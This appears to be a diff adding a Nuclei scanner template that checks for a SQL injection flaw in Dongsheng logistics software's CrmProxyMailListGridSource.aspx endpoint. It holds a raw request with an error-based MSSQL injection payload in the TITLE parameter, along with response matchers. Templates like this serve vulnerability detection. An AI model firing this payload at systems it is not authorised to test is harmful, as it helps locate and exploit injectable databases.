@@ -1,0 +1,34 @@
+id: poc-yaml-dongshengsoft-crmproxymaillistgridsource-aspx-sqli
+info:
+  name: 东胜物流软件 CrmProxyMailListGridSource.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in 东胜物流软件 at the endpoint CrmProxyMailListGridSource.aspx by leveraging the `handle=list` and `TITLE` parameters to verify the injection.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /PriceCarrier/CrmProxyMailListGridSource.aspx?handle=list&cur_page=1&show_page=10&TITLE='and+1%3Csys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLI-Detector
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "CrmProxyMailListGridSource"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
